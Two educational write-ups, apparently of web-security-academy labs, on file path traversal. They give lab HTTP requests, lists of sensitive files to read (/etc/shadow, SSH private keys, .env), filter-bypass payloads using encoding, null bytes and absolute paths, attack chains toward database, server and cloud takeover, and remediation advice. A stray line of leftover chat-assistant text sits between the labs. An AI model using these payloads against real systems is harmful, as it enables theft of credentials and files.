# 🔥Lab-1 File Path Traversal – Full RAW Markdown Write-Up  
(Exact lab-style format + headings + symbols + screenshot placeholder)

---

## 1. 📝 One-Line Summary
Path Traversal allows an attacker to read arbitrary files on the server by escaping the intended directory using sequences like `../`.

---

## 2. ❓ What Is This Vulnerability?
Path traversal happens when:

1. The application loads a file based on **user input**.  
2. It **does not sanitize** path components.  
3. Attacker injects `../` to climb directories.  
4. Backend reads unintended files (e.g., `/etc/passwd`).  

Common vulnerable parameter:  
`filename=report.pdf` → attacker changes to → `filename=../../../../etc/passwd`

---

## 3. 🎯 Why This Matters
A single file inclusion can lead to:

- Source code disclosure  
- Credential leaks  
- SSH key theft  
- Exposing cloud environment variables  
- Reading internal configuration files  
- Privilege escalation  

Impact = **Critical**, especially when sensitive files exist.

---

## 4. 🔍 Real-World Scenarios

### • Linux Password File Exposure  
`../../../../etc/passwd`

### • Apache Config Leak  
`../../../etc/apache2/apache2.conf`

### • Windows Credential Theft  
`..\..\..\windows\win.ini`

### • Source Code Exposure  
`../../../var/www/app/config.php`

If logs are accessible, you can leak credentials, JWT secrets, DB passwords.

---

## 5. 🏗️ Step-By-Step Lab Walkthrough

### ✔ Step 1 — Visit Product Image Page
The lab loads images dynamically:  
`/image?filename=38.jpg`

### ✔ Step 2 — Send the request to Repeater
```
GET /image?filename=38.jpg HTTP/2
Host: LAB-ID.web-security-academy.net
```

### ✔ Step 3 — Replace filename with traversal payload
```
GET /image?filename=../../../etc/passwd HTTP/2
```

### ✔ Step 4 — Send the request  
If vulnerable, server responds with the content of `/etc/passwd`.

### ✔ Step 5 — Confirm by checking markers  
Look for lines like:
```
root:x:0:0:root:/root:/bin/bash
```

### ✔ Step 6 — Lab is solved once `/etc/passwd` is retrieved.

---

## 6. 📸 Screenshot 

**Screenshot of Burp Repeater showing fetched /etc/passwd**

![path traversal to fetch passwords](../images/path-traversal-passwd.png)

---

## 7. 🧲 Common High-Value Files to Target

### 🟦 Linux Targets
- `/etc/passwd`  
- `/etc/shadow` (if readable)  
- `/var/www/html/config.php`  
- `/home/*/.ssh/id_rsa`

### 🟥 Windows Targets
- `C:\Windows\win.ini`  
- `C:\Windows\System32\drivers\etc\hosts`  
- `C:\Users\Administrator\.ssh\id_rsa`

### 🟨 App-Level Targets
- `.env`  
- `config.json`  
- `database.yml`  

---

## 8. 🔗 Multi-Chain Attack Possibilities
- Path Traversal → Read PHP config → DB creds → DB takeover  
- Path Traversal → Read SSH keys → Remote shell  
- Path Traversal → Leak JWT secret → Account takeover  
- Path Traversal → Source code disclosure → RCE via hidden endpoints  

---

## 9. 🛡️ Remediation
- Canonicalize + normalize paths  
- Enforce strict allowlisting of filenames  
- Strip sequences like `../` and `..\`  
- Disable direct filesystem access where possible  
- Use per-user virtual file systems or UUID-based filenames  

---

## 10. 📌 Final Summary
Path Traversal occurs when user input directly affects filesystem paths without sanitization. By replacing filenames with traversal sequences (`../`), attackers can read sensitive files like `/etc/passwd`, leak secrets, escalate privileges, or even achieve full server compromise.

---

Understood.
Here is your FULL RAW MARKDOWN SOURCE WRITE-UP, identical format, same headings, same styling, same structure, with 1 screenshot placeholder, NOT rendered, symbols visible, exactly like your Blind SSRF lab.

Everything is inside a code block so nothing renders.


---

# 🔥Lab-2 Path Traversal – Obstacles & Bypass Techniques (RAW Markdown Write-Up)

---

## 1. 📝 One-Line Summary
This lab shows how weak filters fail to block Path Traversal and how attackers bypass them using absolute paths like **/etc/passwd**, encoded traversal, double-encoding, and mixed separators.

---

## 2. ❓ What Is This Vulnerability?
The server tries to block traversal sequences such as:

../ ..\

But the filters are incomplete.

If the attacker sends an **absolute path**, like:

/etc/passwd

the server builds:

base_path + "/etc/passwd"

Filesystem resolves it → attacker reads **/etc/passwd**.

This completely bypasses traversal filtering.

---

## 3. 🎯 Why This Matters
Poor “../ removal” filters DO NOT prevent Path Traversal.

This leads to:

- Leakage of sensitive system files  
- Exposure of application secrets  
- Database compromise  
- SSH key theft  
- Cloud credential theft  
- Log poisoning → RCE  

Impact = **Critical**

---

## 4. 🔍 Real-World Scenarios
### • Absolute Path Bypass  
Used when developers only block "../".

### • Encoded Traversal  
URL-encoded or double-encoded sequences bypass filters.

### • Log Poisoning + Traversal  
Load poisoned log → execute payload.

### • Read Cloud Secrets  
/.env → AWS keys → cloud takeover.

---

## 5. 🏗️ Step-By-Step Lab Walkthrough

### ✔ Step 1 — Open any product page  
It loads an image using:

/image?filename=5.png

### ✔ Step 2 — Send request to Repeater  
Look for:

filename=5.png

### ✔ Step 3 — Try normal traversal (blocked)

filename=../../../etc/passwd

Server blocks it → filter activates.

### ✔ Step 4 — Use bypass: Absolute Path  
Replace with:

filename=/etc/passwd

### ✔ Step 5 — Send request  
Server returns the contents of:

/etc/passwd

Lab solved.

---

## 6. 📸 Screenshot (Insert Here)

**Screenshot showing /etc/passwd being returned after using absolute path bypass**

![path traversal bypass by replacing file loction from root source](../images/path-traversal-rootfile-passwd.png)

---

## 7. 🧲 High-Value Bypass Techniques

### 🟦 Absolute Path Bypass

/etc/passwd /etc/shadow /var/www/html/config.php /home/admin/.ssh/id_rsa

### 🟥 Encoded Traversal

..%2f..%2fetc/passwd %2e%2e/%2e%2e/etc/passwd

### 🟨 Double Encoding

%252e%252e%252fetc%252fpasswd

### 🟩 Overlong UTF-8

%c0%ae%c0%ae/

### 🟦 Dot-Dot Tricks

....//....//etc/passwd ..../..../etc/passwd

### 🟥 Null Byte Injection

../../../etc/passwd%00.png

### 🟨 Mixed Separators (Windows)

......\Windows\win.ini ..%5c..%5cWindows\win.ini

---

## 8. 🔗 Multi-Chain Attack Possibilities

### 🔥 Chain 1 — Filter Bypass → Config File → DB Takeover
1. Use absolute path  
2. Read `/var/www/html/config.php`  
3. Extract DB password  
4. Log into DB  
5. Dump users  

---

### 🔥 Chain 2 — Read SSH Keys → Full Server Control
1. Read `/home/ubuntu/.ssh/id_rsa`  
2. SSH into server  
3. Full system compromise  

---

### 🔥 Chain 3 — Logs → Poisoned Logs → RCE
1. Read `/var/log/nginx/access.log`  
2. Send malicious User-Agent  
3. Load log via traversal  
4. Code executes → Webshell  

---

### 🔥 Chain 4 — .env Files → Cloud Keys → AWS Takeover
1. Read `/.env`  
2. Steal AWS keys  
3. S3 takeover  
4. Full cloud access  

---

## 9. 🛡️ Remediation
- Canonicalize + normalize path before checking  
- After decoding, block:
  - `../`
  - `..\`
  - `%2e%2e`
  - `%5c`
- Use strict allowlisting of filenames  
- Never append user input directly to file paths  
- Restrict filesystem permissions  

---

## 10. 📌 Final Summary
This lab demonstrates how weak path traversal filters are easily bypassed using **absolute paths**, encoding tricks, and mixed traversal sequences. Reading `/etc/passwd` confirms the vulnerability and completes the lab.

---
